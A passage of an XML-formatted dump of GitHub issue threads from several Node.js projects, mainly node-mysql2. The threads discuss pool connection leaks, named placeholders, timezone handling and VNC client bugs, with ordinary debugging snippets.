There was a number of changes in `Pool.query` implementation to allow to access query command, might be a bug there. example would be very helpful!
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>hi @dolphin278  - any update on this?
</Body>
    </Comment>
    <Comment>
      <Owner>dolphin278</Owner>
      <Body>@sidorares I've got narrowed it down &#8211;&#160;when `Pool.query` used in two argument form &#8211;&#160;`sql` and `cb` only, callback freeing pool connection (that is [passed to `conn.query`](https://github.com/sidorares/node-mysql2/blob/master/lib/pool.js#L134)) is never called. Moreover, even if it will be called, it will work incorrectly &#8211;&#160;[`cb` argument here](https://github.com/sidorares/node-mysql2/blob/master/lib/pool.js#L136) is always a third argument regardless, whether there was two- or three-argument invocation (i.e. actual `cb` went to `values`).

I've put some clumsy ad-hoc solution for my own use, which is not 100% compatible with your original code (it does not return `cmdQuery` object):

``` js
function (sql, values, cb) {
    if (typeof values === 'function') {
      cb = values;
      values = [];
    }
    this.getConnection(function (err, conn) {
      if (err) return cb(err);
      var cmdQuery = Connection.createQuery(sql, values, function () {
        conn.release();
        if (typeof cb === 'function') return cb.apply(this, arguments);
      });
      conn._resolveNamedPlaceholders(cmdQuery);
      var rawSql = conn.format(cmdQuery.sql, cmdQuery.values || []);
      cmdQuery.sql = rawSql;
      conn.query(cmdQuery);
    });
  };
```
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>oh. Yes, createQuery parameters are incorrect

Corresponding code from node-mysql https://github.com/felixge/node-mysql/blob/1720920f7afc660d37430c35c7128b20f77735e3/lib/Pool.js#L184-L212

with few modifications should be possible to do in a similar way

``` js
Pool.prototype.query = function (sql, values, cb) {
  var cmdQuery = Connection.createQuery(sql, values);
  this.getConnection(function (err, conn) {
    if (err) {
       cmd.on('error', function() {});
       cmd.onResult(err);
       return;
    }
    conn._resolveNamedPlaceholders(cmdQuery);
    var rawSql = conn.format(cmdQuery.sql, cmdQuery.values || []);
    cmdQuery.sql = rawSql;
    conn.query(cmdQuery).once('end', function() {
       conn.release();
    })
  });
  return cmdQuery;
};
```

would you be able to test this and submit pr?
</Body>
    </Comment>
    <Comment>
      <Owner>dolphin278</Owner>
      <Body>@sidorares I am so sorry for the delay, I will get back to this ASAP (hopefully, this weekend)
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Thanks @dolphin278 ! If you happen to work on this please have a look at linked issues as well. I'm afraid I wont have time for next week or two
</Body>
    </Comment>
    <Comment>
      <Owner>bitcloud</Owner>
      <Body>@dolphin278 could you recheck with current master? 
</Body>
    </Comment>
    <Comment>
      <Owner>felixfbecker</Owner>
      <Body>I have the same issue, always using the `query(options, cb)` syntax (because of https://www.npmjs.com/package/sql-template-strings). I can make one request to the API (which will do a _lot_ of queries), then on the second it will just hang. It totally seems like it uses the maximum connections on the first request without freeing and on the second there are no connections left, so it waits forever to get a connection.
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@felixfbecker can you check it's "full pool" problem by logging `pool._freeConnections.length`, `pool._allConnections.length` and `pool._connectionQueue.length` ? you'll see _connectionQueue is growing and _allConnections at constant maximum level if connections never relaesed
</Body>
    </Comment>
    <Comment>
      <Owner>dolphin278</Owner>
      <Body>Finally, I got back and tried to reproduce original issue on 1.1.1. Can not reproduce it anymore. So issue looks like a resolved one.

Got some other weird stuff, like not releasing connection back to pool after executing `pool.executeAsync` (we use bluebird's promisification on pool, while current Promise-based api hides useful internal state vars like queue length you mentioned in this thread), but this problem is for another issue.
</Body>
    </Comment>
    <Comment>
      <Owner>dolphin278</Owner>
      <Body>&gt; Got some other weird stuff, like not releasing connection back to pool after executing pool.executeAsync (we use bluebird's promisification on pool, while current Promise-based api hides useful internal state vars like queue length you mentioned in this thread), but this problem is for another issue.

Partly &#8211; it my own error &#8211; I&#160;called promisified `.executeAsync` without array of args, just sql, and among execution `values` argument that finally arrived at `Connection.prototype.execute` had value of:

``` js
function (err, value) {
        if (promise === null) return;
        if (err) {
            var wrapped = wrapAsOperationalError(maybeWrapAsError(err));
            promise._attachExtraTrace(wrapped);
            promise._reject(wrapped);
        } else if (!multiArgs) {
            promise._fulfill(value);
        } else {
            var $_len = arguments.length;var args = new Array(Math.max($_len - 1, 0)); for(var $_i = 1; $_i &lt; $_len; ++$_i) {args[$_i - 1] = arguments[$_i];};
            promise._fulfill(args);
        }
        promise = null;
    } cb: function () {
      console.log('pool:execute:cb');
      conn.release();
      cb.apply(this, arguments);
    }
```

But what interesting, calling `.queryAsync` using same args instead of `.executeAsync` has not give me any problems, so it's a bug, after all.
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>so both `queryAsync` and executeAsync` come from bluebird promisification? Could you post a very simple self-contained test to reproduce issue?
</Body>
    </Comment>
    <Comment>
      <Owner>DJ-DJL</Owner>
      <Body>I am getting this same issue with the `execute` method on a connection pool (when called with no parameters the connections are not released).&#13;
I traced it to this function in pool.js&#13;
```&#13;
    execute: function (sql, args) {&#13;
      return new Promise(function (resolve, reject) {&#13;
        var done = makeDoneCb(resolve, reject);&#13;
        if (args) {&#13;
          corePool.execute(sql, args, done);&#13;
        } else {&#13;
            corePool.execute(sql, {}, done);&#13;
        }&#13;
      });&#13;
    },&#13;
```&#13;
&#13;
mysql2 version: 1.1.1&#13;
changing line 105 to this fixes the issue for me:&#13;
`corePool.execute(sql, {}, done);`&#13;
I think a similar fix may also be needed on line 57?&#13;
&#13;
((This is my first comment on github so please accept my apology if I did something wrong or missed something out))</Body>
    </Comment>
    <Comment>
      <Owner>felixfbecker</Owner>
      <Body>I am also still getting this issue. I don't have to time to investigate much, but it only happens when using the methods on the pool directly. I worked around it by first getting a connection with `getConnection()`.</Body>
    </Comment>
  </Issue_526>
  <Issue_527>
    <Repository>node-mysql2</Repository>
    <Title>only resolve named placeholders if values is an object</Title>
    <Owner>sidorares</Owner>
    <Body>Would it be an idea, to only resolve named placeholders for `options.sql` when type of `options.values` is an object.

The problem is, that I can not set `namedPlaceholder: true` in the general config, and then execute a query like: `conn.execute('SELECT * FROM items WHERE id = ?;', [ id ]);`

I think the `namedPlaceholders` config should simply be to allow for named placeholders, but still work with the other query methods.

If I create tests and PR, are you interested in accepting it and make a release? Or where are you in your release plans.
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>yes, probably.

you can actually change config after connection ( those flags that don't affect handshake ) but I see your point. @dougwilson - can I ask your thoughts on this?
</Body>
    </Comment>
    <Comment>
      <Owner>danieljuhl</Owner>
      <Body>Yes, you are right - and that is my current workaround...

But I don't like, that I keep changing the connections configuration each time I make a query/execute. As I use a pool, I have to explicit set namedPlaceholders on the connection for each request, to make sure it is correct according to my current query.

So hope that we can agree on a better pattern to handle namedPlaceholders.
</Body>
    </Comment>
    <Comment>
      <Owner>dougwilson</Owner>
      <Body>Makes sense, I suppose, though adds complexity. Could probably make the rule be array values vs non-array values.
</Body>
    </Comment>
    <Comment>
      <Owner>danieljuhl</Owner>
      <Body>My idea would simply be to check if it is an array, otherwise resolve as named params- it does not sound like much complexity imo.
</Body>
    </Comment>
    <Comment>
      <Owner>gajus</Owner>
      <Body>I think it is worth considering removing the `namedPlaceholder` configuration in the first place, and use logic: if values is array, use anonymous placeholders, else use named placeholders. This would be a simple change here, https://github.com/sidorares/node-mysql2/blob/936997b69fc432fe0215e328ce42ba29541c100d/lib/connection.js#L455</Body>
    </Comment>
  </Issue_527>
  <Issue_528>
    <Repository>node-mysql2</Repository>
    <Title>namedPlaceholders with IN clause</Title>
    <Owner>sidorares</Owner>
    <Body>It would be nice to have namedPlaceholders convert arrays of data into an IN clause.

I would like the following to be possible:

```
var parms = {
   keys: [1,2,3,4,5,6,7]
};

db.pool.execute('SELECT id FROM table WHERE id IN (:keys)', parms, function(res, err) {
});
```

It should execute to the following:

```
SELECT id FROM table WHERE id IN (?,?,?,?,?,?,?)
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>ETPac</Owner>
      <Body>Is there a way to query an in clause? When I try to run something like the above statement it only runs the first key in the group. I think there is a bug that only uses the first item in the array even if its a string
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>There is currently 'arrayToList' [in SqlString](https://github.com/sidorares/node-mysql2/blob/master/lib/sql_string.js#L60-L65), but it seems that it does not work for example like `mysql.query("select * from mysql.user where Host in ?", [['localhost', '127.0.0.1']], ... )`, I'll look into code/documentation more

@steven10172 - I'd like to keep named placeholders semantics close to unnamed, so Ideally we need to make unnamed `?` to work with array parameters
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@steven10172 for binary protocol ( prepared statements ) one placeholder always represent one prepared statement parameter. 

``` js
// text protocol, works without helper:
db.query("select * from mysql.user where Host in (:hosts)", { hosts: ['localhost', '127.0.0.1'] }, ...);

// binary protocol: hosts is one single parameter, serialised as `['localhost', '127.0.0.1'].toString()` 
db.execute("select * from mysql.user where Host in (:hosts)", { hosts: ['localhost', '127.0.0.1'] }, ...);
// result is execute "select * from mysql.user where Host in (?)" with "localhost,127.0.0.1" as parameter
// probably not what you expect
```

I'd probably suggest `db.query()` for examples like this. Alternatively, you can build query dynamically:

``` js
var hosts = ['localhost', '127.0.0.1'];
db.execute("select * from mysql.user where Host in (" + hosts.map( () =&gt;'?' )+ ")", hosts, cb);
```
</Body>
    </Comment>
  </Issue_528>
  <Issue_529>
    <Repository>node-mysql2</Repository>
    <Title>Enhancement:fix handshake seed value for jdbc ascii encoding</Title>
    <Owner>sidorares</Owner>
    <Body>mysql java jdbc seed encoding is ascii ,where seed encoding char larger than ascii,hand shake failed
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>could you elaborate a bit more how to reproduce problem you are solving? This is server part of the protocol - can you show the client code that is accessing mysql2-based server?
</Body>
    </Comment>
    <Comment>
      <Owner>piaohai</Owner>
      <Body>Server:

var mysql = require('mysql2');

var server = mysql.createServer();
server.listen(3307);
server.on('connection', function(conn) {

  console.log('connection');

  var socket = conn.stream;

  conn.serverHandshake({
    protocolVersion: 10,
    serverVersion: '5.6.10',
    connectionId: 1234,
    statusFlags: 2,
    characterSet: 8,
    capabilityFlags: 0xffffff,
    authCallback: function(params, cb){
        var pass = "helloword";
        var doubleSha = auth.doubleSha1(pass);
        var isValid = auth.verifyToken(params.authPluginData1, params.authPluginData2, params.authToken, doubleSha);
        console.log(isValid);
     }
   });
});

Client:

public class Test {

```
public static void main(String[] args) throws SQLException, IOException {
    getConnection();
    System.in.read();
}

public static void test() {

}

public static Connection getConnection() throws SQLException {
    Connection conn = null;
    Properties connectionProps = new Properties();
    connectionProps.put("user", "root");
    connectionProps.put("password", "helloword");
    try {
        Class.forName("com.mysql.jdbc.Driver");
    } catch (ClassNotFoundException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }

    conn = DriverManager.getConnection("jdbc:mysql://localhost:3307/mysql?&amp;autoReconnect=false&amp;connectTimeout=5000&amp;socketTimeout=50000",
            connectionProps);

    System.out.println("Connected to database");
    return conn;
}
```

}

jdbc client connect handshake failed.
</Body>
    </Comment>
    <Comment>
      <Owner>piaohai</Owner>
      <Body>threadId = buf.readLong();
this.seed = buf.readString("ASCII", getExceptionInterceptor());

mysql jdbc driver protocol read 
</Body>
    </Comment>
  </Issue_529>
  <Issue_530>
    <Repository>node-mysql2</Repository>
    <Title>Sporadically getting EventEmitter memory leak warning when using LOAD INFILE with stream</Title>
    <Owner>sidorares</Owner>
    <Body>I am calling connection.query ({sql: sql, infileStreamFactory: function (){ return stream; }}) many times over the life of a connection. Each time, stream is a different object. However, I see that the warning is happening when _streamLocalInfile in query.js is attaching an event listener to connection.stream. 

Perhaps there should be calls to removeListener on the connection.stream object once the localStream has ended?

Thanks

Alessandro

(node) warning: possible EventEmitter memory leak detected. 11 listeners added. Use emitter.setMaxListeners() to increase limit.
Trace
    at Socket.addListener (events.js:160:15)
    at Query._streamLocalInfile (node_modules/mysql2/lib/commands/query.js:122:21)
    at Query.resultsetHeader (node_modules/mysql2/lib/commands/query.js:99:10)
    at Query.Command.execute (node_modules/mysql2/lib/commands/command.js:34:20)
    at Connection.handlePacket (node_modules/mysql2/lib/connection.js:310:28)
    at PacketParser.onPacket (node_modules/mysql2/lib/connection.js:83:65)
    at PacketParser.executeStart (node_modules/mysql2/lib/packet_parser.js:39:12)
    at Socket.&lt;anonymous&gt; (node_modules/mysql2/lib/connection.js:95:31)
    at Socket.emit (events.js:95:17)
    at Socket.&lt;anonymous&gt; (_stream_readable.js:764:14)
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Interesting. Would it be possible to reduce to a minimal test I could reproduce on my side?
</Body>
    </Comment>
  </Issue_530>
  <Issue_531>
    <Repository>node-mysql2</Repository>
    <Title>real jit in addition to 'userspace JIT'</Title>
    <Owner>sidorares</Owner>
    <Body>We are currently generating JS from JS to speed up parsing based on structure in query response. Should be possible to generate real machine code with https://github.com/indutny/jit.js 
</Body>
    <State>open</State>
    <Comment>
      <Owner>mscdex</Owner>
      <Body>If you end up adding this, make it an optional dependency. That way `mysql2` can remain "compilation-free."
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>sure, having zero native modules in deps makes it much more portable between node versions and architectures. From initial spike of jit.js - it's not trivial, everything I tried is much slower than js code with optimizing V8 compiler
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>TODO: investigate V8 suport and perf benefits of asm.js / webassembly and generate asm if there is a benefit
</Body>
    </Comment>
    <Comment>
      <Owner>thewillhuang</Owner>
      <Body>another thing to keep a eye on is amazon lambda, having no extra dependencies will make it much easier to use this module for lambda
</Body>
    </Comment>
  </Issue_531>
  <Issue_532>
    <Repository>node-mysql2</Repository>
    <Title>Multiple Consecutive Requests Hang Application</Title>
    <Owner>sidorares</Owner>
    <Body>When I hit a page on my NodeJS app using the mysql2 adapter with SSL,  it seems to work ok until I reload the page more than 3-4 times in a row.  The app then hangs and there is nothing in the error output to explain what has happened even with debug flag set.

I also noticed a typo in connection_config.js:

```
 this.cmpress            = options.compress;
```

Again, as I appreciate the ability to use SSL with this library, I don't get the hanging issue with node-mysql and can't afford that uncertainty.
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Does this hanging happen when you use pool?
</Body>
    </Comment>
    <Comment>
      <Owner>crh3675</Owner>
      <Body>Yes, I have configured pool with 10 connections.  It starts hanging at the 4th - 5th HTTP request.  And it's odd because there is no debug output at all.
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>there is no debug logging in my driver, I need to add it (that is, .debug config is just ignored currently)
Your issue might be the same as #61  I'll try to cherry pick latest pool changes from node-mysql - as pool uses only high level api it should be possible to completely reuse pool functionality from node-mysql (personally I'd prefer pool to be external module)
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Could you try again from master?
</Body>
    </Comment>
    <Comment>
      <Owner>crh3675</Owner>
      <Body>Thanks, i'll try it out early tomorrow
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Thanks a lot! I'll try to add debug logging meanwhile
</Body>
    </Comment>
    <Comment>
      <Owner>crh3675</Owner>
      <Body>I just tried from master and received this error:

```
Calling conn.end() to release a pooled connection is deprecated. In next version calling conn.end() will be restored to default conn.end() behavior. Use conn.release() instead.
```

And the database wouldn't return any data
</Body>
    </Comment>
    <Comment>
      <Owner>crh3675</Owner>
      <Body>By the way, the way i am handling this using SailsJS is by duplcating the sails-mysql module as sails-mysql-ssl and adding in your mysql2 library and changing the include in the main adapter file.
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Can you post your code? You should have the same error message using node-mysql (unless sailsjs is using older mysql module before .end -&gt; .release switch). You should be able to use mysql2 without modifying `require` if you change package.json to have line like this: `"mysql": "git+https://github.com/sidorares/node-mysql2.git"`
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Yes, sails-mysql is using mysql@2.0.0-alpha8, which is before migrating from .end to .release in pool
</Body>
    </Comment>
    <Comment>
      <Owner>crh3675</Owner>
      <Body>So I presume I would have to update the custom sails-mysql-ssl module and change .end() to .release()
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I suggest to test your changes and send PR upstream - .end is deprecated anyway
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>do you have sails-mysql-ssl published? I'd like to try it myself
</Body>
    </Comment>
    <Comment>
      <Owner>crh3675</Owner>
      <Body>I haven' published but the changes are really minimal, just change these lines in the lib/adapter.js file

Line 10:

```
var mysql = require('mysql2');
```

Line 618 (add SSL options):

```
      ssl: {
           cert : config.ssl &amp;&amp; config.ssl.cert ? config.ssl.cert : null,
           key  : config.ssl &amp;&amp; config.ssl.key  ? config.ssl.key  : null
         }
```
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Could you try with latest node-mysql and we'll see if there is remaining problems in mysql2 re pooled connection
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>here are my changes to make node-mysql@2.0-rc2 work with sailjs-mysql: https://github.com/sidorares/sails-mysql/commit/1da050c91fa4a0d85887ee07cd217b8c16e3860d
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Any feedback on this @crh3675 ?
</Body>
    </Comment>
    <Comment>
      <Owner>crh3675</Owner>
      <Body>Sorry, been a bit swamped lately.  I'll get back as soon as I can. - Thanks.
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Thanks!
</Body>
    </Comment>
    <Comment>
      <Owner>crh3675</Owner>
      <Body>I pulled from master this morning and modified the sails-mysql-ssl module.  For some reason, it no longer wants to connect at all and even with verbose logging, I don't get any output.
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Can I try your version of sails-mysql-ssl? Is it different from https://github.com/sidorares/sails-mysql/commit/1da050c91fa4a0d85887ee07cd217b8c16e3860d ?
</Body>
    </Comment>
  </Issue_532>
  <Issue_533>
    <Repository>node-mysql2</Repository>
    <Title>Use timezone from connection options</Title>
    <Owner>sidorares</Owner>
    <Body>'SELECT FROM_UNIXTIME(631152000)' returns the timestamp in local tz instead of UTC (e.g. for PST, equivalent of 1990-01-31T22:00:00.000Z instead of expected 1990-01-01T00:00:00.000Z)

Simliar issue in mysql-native has been proposed a fix in sidorares/nodejs-mysql-native#78
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Can you give links to other APIs with similar functionality (e.i why UTC and not local tz?) Command line client resut:

``` sql
mysql&gt; SELECT FROM_UNIXTIME(631152000);
+--------------------------+
| FROM_UNIXTIME(631152000) |
+--------------------------+
| 1990-01-01 11:00:00      |
+--------------------------+
1 row in set (0.01 sec) 
```
</Body>
    </Comment>
    <Comment>
      <Owner>noamw</Owner>
      <Body>The proposed fix in https://github.com/sidorares/nodejs-mysql-native/issues/78 indeed converts to UTC as that is the only invariant that can allow for simple coherent API. The other way would be to support time zone conversions, assuming that indeed all users of the library always make use of them (like done in node-mysql).

However, the problem reported here is not specific to that approach - if you use the tz approach, it makes perfect sense you will receive the result in the client timezone as in your example, but please note that in my example, the local time is returned, but it is as if that value is in UTC time zone (notice the Z) !!!!
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>With FROM_UNIXTIME example timezone does not matter - you get js Date object pointing to that 631152000 time.
With DATETIME with no tz info I'll probably add 'use tz from config if present'.

``` js
&gt; a = _rows[0]['FROM_UNIXTIME(631152000)']
Mon Jan 01 1990 11:00:00 GMT+1100 (EST)
&gt; a.toGMTString()
'Mon, 01 Jan 1990 00:00:00 GMT'
&gt; a.toISOString()
'1990-01-01T00:00:00.000Z'
```
</Body>
    </Comment>
  </Issue_533>
  <Issue_534>
    <Repository>node-rfb2</Repository>
    <Title>typescript issue</Title>
    <Owner>sidorares</Owner>
    <Body>I'm try to use latest version from npmjs and get errors while build app&#13;
&#13;
```ts&#13;
ERROR in Error encountered resolving symbol values statically. Could not resolve events relative to /var/home/vtolstov/devel/panel/node_modules/rfb2/rfbclient.d.ts., resolving symbol RfbClient in /var/home/vtolstov/devel/panel/node_modules/rfb2/rfbclient.d.ts&#13;
&#13;
ERROR in ./src/main.ts&#13;
Module not found: Error: Can't resolve './$$_gendir/app/app.module.ngfactory' in '/var/home/vtolstov/devel/panel.swiftbird.org/src'&#13;
 @ ./src/main.ts 4:0-74&#13;
 @ multi main&#13;
&#13;
ERROR in ./~/@angular/core/src/linker/system_js_ng_module_factory_loader.js&#13;
Module not found: Error: Can't resolve '/var/home/vtolstov/devel/panel/src/$$_gendir' in '/var/home/vtolstov/devel/panel/node_modules/@angular/core/src/linker'&#13;
 @ ./~/@angular/core/src/linker/system_js_ng_module_factory_loader.js 69:15-36 85:15-102&#13;
 @ ./~/@angular/core/src/linker.js&#13;
 @ ./~/@angular/core/src/core.js&#13;
 @ ./~/@angular/core/index.js&#13;
 @ ./src/main.ts&#13;
 @ multi main&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I never used TS myself, need much more context from you. What's the setup? What is entry point, where you see the error etc</Body>
    </Comment>
    <Comment>
      <Owner>vtolstov</Owner>
      <Body>This error happening only if i use ng build --prod --aot , without --aot all fine.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>haven't used ng tools as well, sorry&#13;
&#13;
What does `ng build --prod --aot` do? Compiles &amp; bundles all ts into js ahead of time?&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>vtolstov</Owner>
      <Body>&gt; Compiles &amp; bundles all ts into js ahead of time?&#13;
&#13;
yes</Body>
    </Comment>
  </Issue_534>
  <Issue_535>
    <Repository>node-rfb2</Repository>
    <Title>ultravnc_repeater: short read 10 != 250 throws EPIPE</Title>
    <Owner>sidorares</Owner>
    <Body>While trying to connect to ultravnc repeater, I get the error:

```
{ [Error: This socket has been ended by the other party] code: 'EPIPE' }
```

and on the repeater 

```
new vnc client connecting.
ULTRAVNC_REPEATER_NO_RFB: not sending RFB 000.000
ultravnc_repeater: short read 10 != 250
```

my settings to connect to the repeater are:

```
{
    "host"    : 'myrepeater.example.com',
     "port"    : '123456',
      "password": '+ID:12345678'
}
```

Is there a trick to make magic happen or is it just me?

thanks for your help
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I haven't used ultravnc repeater before, can you give a short intro on how to setup everything @zxfrank ?
Alternatively, if you can provide network dump around disconnect time that would be helpful.
Looks like ultravnc does not like something and closes connection
</Body>
    </Comment>
    <Comment>
      <Owner>zxfrank</Owner>
      <Body>ultravnc repeater log only the 3 lines. The nodejs app log the error again and again and again freakin fast. It occurs on init.

I have an old version of the repeater, I will try with the latest tomorrow.

the exact string in ssvnc (proxy/Gateway) to connect is:

```
repeater://hostname:port+ID:_ANY_CHARS
```

http://www.uvnc.com/downloads/repeater/83-repeater-downloads.html
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>thanks, I'll try to play with repeater on my side
</Body>
    </Comment>
    <Comment>
      <Owner>zxfrank</Owner>
      <Body/>
    </Comment>
  </Issue_535>
  <Issue_536>
    <Repository>node-rfb2</Repository>
    <Title>record/replay to/from file</Title>
    <Owner>sidorares</Owner>
    <Body>Hi,

How can i use that functionality?
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Hi! Which format are you going to use? I had an example of "write each rfb packet prefixed with timestamp to file" somewhere but can't find it ( easy to recreate anyway )

also have a look at https://github.com/sidorares/rfbrecord
</Body>
    </Comment>
    <Comment>
      <Owner>krzysztofantczak</Owner>
      <Body>Yeah, i was trying to use rfbrecord with https://github.com/pigshell/nhnick - which is a fork of phantomjs improved with vnc server. It didn't worked :( I'm not that familiar with RFB to tell why.. "rect" event was never received there. 
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>are you able to connect with any other vnc viewer?

Also, for screen recording of browser session I'd probably try using built-in screencast via remote debugger - https://chromedevtools.github.io/debugger-protocol-viewer/Page/#method-startScreencast 
</Body>
    </Comment>
  </Issue_536>
  <Issue_537>
    <Repository>node-rfb2</Repository>
    <Title>requestUpdate throws TypeError: undefined</Title>
    <Owner>sidorares</Owner>
    <Body>requestUpdate throws a TypeError due to undefined:

.../rfb2/rfbclient.js:446
                    tile.foregroundColor.copy(tile.buffer, offset);
                                         ^
TypeError: Cannot call method 'copy' of undefined

I noticed that foregroundColor was misspelled ("foreroundColor", missing a 'g'). I fixed the naming, but that didn't solve it.
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>could you make PR? Also, this indicates you have hextile encoding in your list of accepted encodings. It's implementation is still very buggy, I suggest to specify explicitly with `encodings` parameter:

``` js
var r = rfb.createConnection({
  host: '127.0.0.1',
  port: 5900,
  password: 'secret',
  encodings: [rfb.encodings.raw, rfb.encodings.copyRect]
});
```
- see https://github.com/sidorares/node-rfb2/blob/master/rfbclient.js#L235. I guess I need to document this and remove hextile from list of default encodings
</Body>
    </Comment>
    <Comment>
      <Owner>ceineke</Owner>
      <Body>I made a pull request for the misspelled 'foreround' property. After fixing that though, overriding the encodings still throws the same error.
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Thanks! I'm not sure what else I can do here - if you don't have sensitive data maybe you post tshark/wireshark session dumps with working client and with rfb2? 
</Body>
    </Comment>
  </Issue_537>
  <Issue_538>
    <Repository>node-tick</Repository>
    <Title>process out of memory</Title>
    <Owner>sidorares</Owner>
    <Body>Hello, 

I'm trying to process the v8, but I'm getting this message after ~ 30 minutes:
# node-tick-processor --ignore-unknown --unix v8-30834.log|tee v8-30834.out

FATAL ERROR: CALL_AND_RETRY_2 Allocation failed - process out of memory

The process node-tick uses 100% of CPU and almost 40% of memory.

File: v8-30834.log, 646M
Nodejs version: node-v0.10.36-linux-x64
CentOS release: 6.6
Memory: 4G
VMWare, 4CPUs Intel(R) Xeon(R) CPU E5-4620 0 @ 2.20GHz

Server haven't swapped out.

Am I missing something?

Thank you,
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>this module processes log file as stream line by line, and I tried it with log files 2-3 Gb big, so this is a bit surprising. Can you upload zipped log file somewhere and post link here? ( if there is something you don't want to expose you can send me link via email - sidorares@yandex.ru . I think only function names are visible in the log file )
</Body>
    </Comment>
    <Comment>
      <Owner>flaviotorres</Owner>
      <Body>Hi,

Just got my files processed by adding 'max-old-space-size', ex:
$ node --max-old-space-size=6144 /opt/nodejs/bin/node-tick-processor --ignore-unknown --unix v8-30838.log

Also, I've sended to you an email with instructions to download my file and test against it.

Thank you for your quick reply. 
Regards,
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>hi! Sorry for silence. Tried your file some time ago and it does indeed take a lot of ram ( ~1.7G ) but finishes successfully after approx 10 minutes. Tried it with iojs 2.3.1 
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I guess I'll need to profile profiler :)
</Body>
    </Comment>
    <Comment>
      <Owner>tsirolnik</Owner>
      <Body>What worked for me was as @flaviotorres said, adding the --max_old_space_size flag</Body>
    </Comment>
  </Issue_538>
  <Issue_539>
    <Repository>node-tick</Repository>
    <Title>API to call the parser from your code</Title>
    <Owner>sidorares</Owner>
    <Body>Useful if you don't want to bother installing `node-tick` globally, and just want to write a small benchmark script which directly writes the results into a file
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Yes, would be good to have. Also "statistical call graph" api
</Body>
    </Comment>
  </Issue_539>
  <Issue_540>
    <Repository>node-vim-debugger</Repository>
    <Title>Integration with mocha</Title>
    <Owner>sidorares</Owner>
    <Body>I often use cli debugger with mocha via `mocha debug test/foo/bar`. It would be great to have `mocha vimdebug test/foo/bar` (if possible without modification to mocha, via mocha.opts + --require )
</Body>
    <State>open</State>
    <Comment>
      <Owner>alFReD-NSH</Owner>
      <Body>Just a reminder that mocha isn't the only test runner out there...
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Of course, feel free to submit PR for yours :) ( and I'm not aware of others that can spawn test + debugger )
</Body>
    </Comment>
    <Comment>
      <Owner>AndrewRayCode</Owner>
      <Body>@sidorares have you gotten this to work with vanilla mocha? that's what i'm looking at now
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@DelvarWorld no, I haven't looked at this yet
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@DelvarWorld afaik you can start mocha tests with `--debug-brk`, that way workflow should be identical as documented in the readme
</Body>
    </Comment>
    <Comment>
      <Owner>Seikho</Owner>
      <Body>You can also debug the `mocha` unit tests by running by debugging `node_modules/mocha/bin/_mocha` from your root project folder. This assumes you have mocha installed as a (dev-)dependency in your project (as it should be).
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>yes, I'm just thinking about best way on how to integrate this for mocha users which would require wery little configuration ( line in mocha.opts or something similar )
</Body>
    </Comment>
    <Comment>
      <Owner>Seikho</Owner>
      <Body>Instructions in the readme should be sufficient, in my opinion.
Create a `debug.js` in the root project require that contains the code:

``` javascript
require('node_modules/mocha/bin_mocha')
```

Then use `node-vim-inspector debug.js` to get started.
</Body>
    </Comment>
  </Issue_540>
  <Issue_541>
    <Repository>node-x11</Repository>
    <Title>This is a question about XFIXES</Title>
    <Owner>sidorares</Owner>
    <Body>this client supports the method XFixesGetCursorImage?&#13;
Because i don't see in ext/fixes.js . If there is support how I can call?</Body>
    <State>open</State>
